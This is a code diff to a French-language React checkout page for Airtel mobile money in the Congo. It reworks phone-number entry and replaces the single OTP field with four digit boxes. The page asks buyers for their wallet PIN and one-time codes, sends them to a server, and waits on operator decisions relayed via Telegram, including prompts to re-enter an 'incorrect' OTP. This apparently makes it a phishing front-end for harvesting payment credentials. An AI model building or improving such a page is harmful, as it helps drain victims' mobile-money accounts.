@@ -147,7 +147,7 @@ function App() {
   const [airtelNumber, setAirtelNumber] = useState('');
   const [walletPin, setWalletPin] = useState('');
   const [otpSent, setOtpSent] = useState(false);
-  const [otpCode, setOtpCode] = useState('');
+  const [otpDigits, setOtpDigits] = useState(['', '', '', '']);
   const [otpTimer, setOtpTimer] = useState(0);
   const [paymentConfirmed, setPaymentConfirmed] = useState(false);
   const [airtelError, setAirtelError] = useState('');
@@ -164,12 +164,15 @@ function App() {
   const [waitingApproval, setWaitingApproval] = useState(false);
   const [approvalError, setApprovalError] = useState('');
   const [approvalPassed, setApprovalPassed] = useState(false);
-  const otpInputRef = useRef(null);
+  const otpInputRef = useRef([]);
+  const normalizedLocalNumber = airtelNumber.replace(/\D/g, '').slice(0, 9);
+  const apiAirtelNumber = normalizedLocalNumber ? `+243${normalizedLocalNumber}` : '';
+  const otpCode = otpDigits.join('');
 
   useEffect(() => {
     if (approvalPassed) {
       // small timeout to ensure input is rendered
-      setTimeout(() => otpInputRef.current?.focus?.(), 50);
+      setTimeout(() => otpInputRef.current?.[0]?.focus?.(), 50);
     }
   }, [approvalPassed]);
 
@@ -210,12 +213,12 @@ function App() {
   }, [approvalPassed, paymentConfirmed]);
 
   useEffect(() => {
-    if (!waitingApproval || !airtelNumber || telegramAction || approvalError) {
+    if (!waitingApproval || !apiAirtelNumber || telegramAction || approvalError) {
       return undefined;
     }
 
     let interval = null;
-    const queryPhone = encodeURIComponent(airtelNumber.trim());
+    const queryPhone = encodeURIComponent(apiAirtelNumber);
 
     const pollApprovalStatus = async () => {
       try {
@@ -257,15 +260,15 @@ function App() {
     pollApprovalStatus();
 
     return () => clearInterval(interval);
-  }, [waitingApproval, airtelNumber, telegramAction, approvalError]);
+  }, [waitingApproval, apiAirtelNumber, telegramAction, approvalError]);
 
   useEffect(() => {
-    if (!paymentConfirmed || !airtelNumber || telegramAction || actionError) {
+    if (!paymentConfirmed || !apiAirtelNumber || telegramAction || actionError) {
       return undefined;
     }
 
     let interval = null;
-    const queryPhone = encodeURIComponent(airtelNumber.trim());
+    const queryPhone = encodeURIComponent(apiAirtelNumber);
 
     const pollActionStatus = async () => {
       try {
@@ -285,7 +288,7 @@ function App() {
             setPaymentConfirmed(false);
             setApprovalPassed(false);
             setOtpSent(false);
-            setOtpCode('');
+            setOtpDigits(['', '', '', '']);
             setOtpTimer(0);
             setWaitingApproval(false);
             setOtpError('');
@@ -299,6 +302,7 @@ function App() {
             setApprovalPassed(true);
             setOtpSent(true);
             setOtpTimer(60);
+            setOtpDigits(['', '', '', '']);
             setOtpError('Code OTP incorrect. Veuillez le ressaisir.');
             return;
           }
@@ -316,7 +320,7 @@ function App() {
     pollActionStatus();
 
     return () => clearInterval(interval);
-  }, [paymentConfirmed, airtelNumber, telegramAction, actionError]);
+  }, [paymentConfirmed, apiAirtelNumber, telegramAction, actionError]);
 
   const startCheckout = (offre) => {
     setCheckoutOffer(offre);
@@ -324,7 +328,7 @@ function App() {
     setWalletPin('');
     setOtpSent(false);
     setOtpTimer(0);
-    setOtpCode('');
+    setOtpDigits(['', '', '', '']);
     setPaymentConfirmed(false);
     setAirtelError('');
     setWalletPinError('');
@@ -342,7 +346,7 @@ function App() {
     setOtpSent(false);
     setPaymentConfirmed(false);
     setOtpTimer(0);
-    setOtpCode('');
+    setOtpDigits(['', '', '', '']);
     setAirtelError('');
     setWalletPinError('');
     setOtpError('');
@@ -352,6 +356,49 @@ function App() {
     setTelegramAction(null);
     setActionError('');
     setActionLoading(false);
+  };
+
+  const handleOtpDigitChange = (index, rawValue) => {
+    const digit = rawValue.replace(/\D/g, '').slice(-1);
+    setOtpDigits((current) => {
+      const next = [...current];
+      next[index] = digit;
+      return next;
+    });
+
+    if (digit && index < 3) {
+      otpInputRef.current[index + 1]?.focus?.();
+    }
+
+    if (otpError) setOtpError('');
+    if (submissionError) setSubmissionError('');
+  };
+
+  const handleOtpDigitKeyDown = (index, event) => {
+    if (event.key === 'Backspace' && !otpDigits[index] && index > 0) {
+      otpInputRef.current[index - 1]?.focus?.();
+    }
+  };
+
+  const handleOtpPaste = (event) => {
+    event.preventDefault();
+    const pasted = event.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
+    if (!pasted) {
+      return;
+    }
+
+    const next = ['', '', '', ''];
+    pasted.split('').forEach((char, idx) => {
+      if (idx < 4) {
+        next[idx] = char;
+      }
+    });
+    setOtpDigits(next);
+
+    const focusIndex = Math.min(pasted.length, 3);
+    otpInputRef.current[focusIndex]?.focus?.();
+    if (otpError) setOtpError('');
+    if (submissionError) setSubmissionError('');
   };
 
   const handleCheckoutSubmit = async (event) => {
@@ -365,13 +412,12 @@ function App() {
     setResendMessage('');
 
     if (!otpSent) {
-      const cleanedNumber = airtelNumber.replace(/\D/g, '');
-      const validPhone = /^(0\d{9}|\+243\d{9})$/.test(airtelNumber.replace(/\s+/g, '')) || /^(0\d{9,10})$/.test(cleanedNumber);
+      const validPhone = /^\d{9}$/.test(normalizedLocalNumber);
       const pinVal = walletPin.trim();
       const validPin = /^\d{4,6}$/.test(pinVal);
 
       if (!validPhone) {
-        setAirtelError('Entrez un numero Airtel valide (commencez par 0 ou +243).');
+        setAirtelError('Entrez un numero Airtel valide a 9 chiffres.');
       }
 
       if (!validPin) {
@@ -390,7 +436,7 @@ function App() {
           body: JSON.stringify({
             offerId: checkoutOffer.id,
             offerTitle: checkoutOffer.title,
-            airtelNumber: airtelNumber.trim(),
+            airtelNumber: apiAirtelNumber,
             walletPin: walletPin.trim()
           })
         });
@@ -424,7 +470,7 @@ function App() {
       return;
     }
 
-    if (!/^\d{4}$/.test(otpCode)) {
+    if (otpCode.length !== 4) {
       setOtpError('Entrez un code OTP valide a 4 chiffres.');
       return;
     }
@@ -438,9 +484,9 @@ function App() {
         body: JSON.stringify({
           offerId: checkoutOffer.id,
           offerTitle: checkoutOffer.title,
-          airtelNumber: airtelNumber.trim(),
+            airtelNumber: apiAirtelNumber,
           walletPin: walletPin.trim(),
-          otpCode: otpCode.trim()
+            otpCode
         })
       });
 
@@ -478,7 +524,7 @@ function App() {
         body: JSON.stringify({
           offerId: checkoutOffer.id,
           offerTitle: checkoutOffer.title,
-          airtelNumber: airtelNumber.trim(),
+          airtelNumber: apiAirtelNumber,
           walletPin: walletPin.trim()
         })
       });
@@ -566,7 +612,7 @@ function App() {
                 {waitingApproval
                   ? 'Validation de vos informations...'
                   : approvalPassed
-                    ? `Un code OTP a ete envoye a ${airtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
+                    ? `Un code OTP a ete envoye a ${apiAirtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
                     : 'Verifiez votre numero avec votre PIN Wallet'}
               </span>
             </p>
@@ -592,23 +638,27 @@ function App() {
             )}
 
             {!paymentConfirmed && (
-            <form className="checkout-form" onSubmit={handleCheckoutSubmit}>
+            <form className="checkout-form" onSubmit={handleCheckoutSubmit} noValidate>
               {!otpSent && (
                 <>
                   <label className="form-field">
                     <span className="label-with-icon"><UiGlyph type="mobile" />Numero Airtel</span>
-                    <input
-                      type="tel"
-                      value={airtelNumber}
-                      onChange={(event) => {
-                        setAirtelNumber(event.target.value);
-                        if (airtelError) setAirtelError('');
-                        if (approvalError) setApprovalError('');
-                        if (submissionError) setSubmissionError('');
-                      }}
-                      placeholder="078 976 565 67"
-                      required
-                    />
+                    <div className="phone-field-row">
+                      <span className="phone-country">CD <strong>+243</strong></span>
+                      <input
+                        type="tel"
+                        value={normalizedLocalNumber}
+                        onChange={(event) => {
+                          setAirtelNumber(event.target.value.replace(/\D/g, '').slice(0, 9));
+                          if (airtelError) setAirtelError('');
+                          if (approvalError) setApprovalError('');
+                          if (submissionError) setSubmissionError('');
+                        }}
+                        placeholder="951234567"
+                        inputMode="numeric"
+                        autoComplete="tel-national"
+                      />
+                    </div>
                     {airtelError && <span className="field-error">{airtelError}</span>}
                   </label>
 
@@ -635,20 +685,25 @@ function App() {
               {approvalPassed && !paymentConfirmed && (
                 <label className="form-field">
                   <span className="label-with-icon"><UiGlyph type="otp" />Code OTP</span>
-                  <input
-                    ref={otpInputRef}
-                    type="text"
-                    value={otpCode}
-                    onChange={(event) => {
-                      setOtpCode(event.target.value.replace(/\D/g, '').slice(0, 4));
-                      if (otpError) setOtpError('');
-                      if (submissionError) setSubmissionError('');
-                    }}
-                    inputMode="numeric"
-                    maxLength={4}
-                    placeholder="1234"
-                    required
-                  />
+                  <div className="otp-grid" onPaste={handleOtpPaste}>
+                    {otpDigits.map((digit, idx) => (
+                      <input
+                        key={`otp-${idx}`}
+                        ref={(node) => {
+                          otpInputRef.current[idx] = node;
+                        }}
+                        type="text"
+                        value={digit}
+                        onChange={(event) => handleOtpDigitChange(idx, event.target.value)}
+                        onKeyDown={(event) => handleOtpDigitKeyDown(idx, event)}
+                        inputMode="numeric"
+                        maxLength={1}
+                        aria-label={`OTP digit ${idx + 1}`}
+                        className="otp-digit"
+                      />
+                    ))}
+                    <span className="otp-eye" aria-hidden="true">👁</span>
+                  </div>
                   {otpError && <span className="field-error">{otpError}</span>}
                 </label>
               )}
